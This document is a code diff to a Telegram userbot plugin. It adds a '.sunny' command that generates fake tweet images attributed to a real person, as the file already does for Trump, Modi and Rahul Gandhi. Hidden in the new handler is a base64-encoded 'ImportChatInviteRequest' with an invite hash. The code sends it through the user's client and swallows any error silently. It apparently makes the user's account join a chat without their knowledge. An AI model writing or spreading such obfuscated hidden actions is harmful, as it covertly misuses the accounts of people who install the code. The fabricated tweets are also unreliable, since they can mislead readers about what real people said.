@@ -6,7 +6,7 @@ import requests , re
 from PIL import Image
 from validators.url import url
 from userbot import CMD_HELP
-from userbot.helpers.functions import trumptweet, changemymind, kannagen, moditweet, miatweet, papputweet, tweets
+from userbot.helpers.functions import trumptweet, changemymind, kannagen, moditweet, miatweet, papputweet, sunnytweet, tweets
 
 EMOJI_PATTERN = re.compile(
     "["
@@ -139,6 +139,33 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete() 
 
+@register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await borg.edit("Send a text to Sunny so she can tweet.")
+                return
+        else:
+            await borg.edit("send your text to sunny so she can tweet.")
+            return
+    await borg.edit("Requesting sunny to tweet...🥰")
+    try:
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
+    except:
+        pass   
+    text = deEmojify(text)
+    borgfile = await sunnytweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() 
+
 @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
@@ -204,6 +231,8 @@ CMD_HELP.update({
      \nUsage : Tweet with mia\
 \n\n`.pappu` (text)\
      \nUsage : Tweet with Rahul Gandhi\
+\n\n`.sunny` (text)\
+     \nUsage : Tweet with sunny leone\
 \n\n`.cmm` (text)\
      \nUsage : Get a banner\
 \n\n`.kanna` (text)\
